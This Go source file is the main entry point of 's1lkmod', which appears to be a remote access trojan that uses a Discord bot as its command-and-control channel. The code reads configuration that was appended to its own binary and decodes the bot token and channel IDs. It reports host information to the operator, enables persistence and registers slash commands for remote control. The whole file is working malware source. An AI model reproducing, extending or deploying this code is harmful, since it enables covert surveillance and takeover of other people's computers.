package main

import (
	"io/ioutil"
	"os"
	"os/signal"
	"s1lkmod/pkg/modules/info_gather"
	"s1lkmod/pkg/modules/persistence"
	"s1lkmod/pkg/utils/crypto"
	"s1lkmod/pkg/utils/host"
	"strings"

	"github.com/bwmarrin/discordgo"
)

var (
	GuildID        = ""
	channelId      = ""
	authToken      = ""
	removeCommands = true
	hostID         = host.RandomizedId()
)

func CreateSession(authToken string) (session *discordgo.Session) {
	session, err := discordgo.New("Bot " + authToken)
	if err != nil {
		panic(err)
	}

	return
}
func main() {
	// delimiter := "\nSuperCoolDelimiter\n"
	delimiter := "0yWwHopsHbAeEqxw9GTXXFFF9uqFxSp_KBQ9LnhG5qTASiEmI49M9-tyYZOKYm6q"
	bytes, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		panic(err)
	}
	//Elements 0 and 1 contains the stub information
	// dataArray := strings.Split(string(bytes), delimiter)
	dataArray := strings.Split(string(bytes), crypto.Rog1(delimiter))
	guildIdValue := dataArray[1]
	channelIdValue := dataArray[2]
	authTokenValue := dataArray[3]
	GuildID = crypto.Rog0(guildIdValue)
	channelId = crypto.Rog0(channelIdValue)
	authToken = crypto.Rog0(authTokenValue)
	s1lk := CreateSession(authToken)
	// The handler that will be called when the websocket is ready. This event handler will send some basic info about the host to the corresponding channel that was set.
	info_gather.Initial(s1lk, channelId, hostID)
	persistence.Enable(true)
	// The handler who will handle the messages that the application received when a user used an slash command
	s1lk.AddHandler(func(session *discordgo.Session, interaction *discordgo.InteractionCreate) {
		if handler, ok := CommandHandlers[interaction.ApplicationCommandData().Name]; ok {
			handler(session, interaction)
		}
	})

	_ = s1lk.Open()

	// Create the commands in the slash command menu
	registeredCommands := make([]*discordgo.ApplicationCommand, len(Commands))
	for index, command := range Commands {
		cmd, _ := s1lk.ApplicationCommandCreate(s1lk.State.User.ID, GuildID, command)

		registeredCommands[index] = cmd
	}

	defer s1lk.Close()
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, os.Interrupt)
	<-sc

	if removeCommands {
		for _, command := range registeredCommands {
			err := s1lk.ApplicationCommandDelete(s1lk.State.User.ID, GuildID, command.ID)
			if err != nil {
			}
		}

	}

}
